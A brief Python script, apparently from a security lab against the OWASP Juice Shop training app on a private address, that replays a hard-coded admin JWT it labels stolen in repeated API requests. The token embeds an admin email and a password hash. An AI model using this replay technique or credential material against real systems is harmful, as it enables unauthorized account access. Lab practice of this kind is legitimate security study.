import os
import requests
import time

BASE = os.environ.get("JS_TARGET", "http://192.168.100.51:3000").rstrip("/")
TOKEN = os.environ.get("JS_TOKEN", "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0wNyAwOToxMzowNi4yNTEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0wNyAwOToxMzowNi4yNTEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTE0OTM5ODV9.bMu-jNBqWaVLGuiEBGFGc190zVhdkSuyWdhTw0ITd-ds4TjygAK0H-g4a6qglhzdhSXzgoCVHXKpg12a76Eexv4ELAdg6UxHMx5q5JqHRMAB4_4D7gYLee3Oj7e2iHnuqbEL7gWa5_gQbqZ9jrk0493D1kgsG2Ks-Ppe-qzNCW0")

headers = {"Authorization": f"Bearer {TOKEN}"}
URL = f"{BASE}/api/Products"

for i in range(10):
    print(f"[*] Using stolen token, request {i+1}")
    r = requests.get(URL, headers=headers, timeout=5)
    print("Status:", r.status_code)
    print("Length:", len(r.text))
    time.sleep(1)
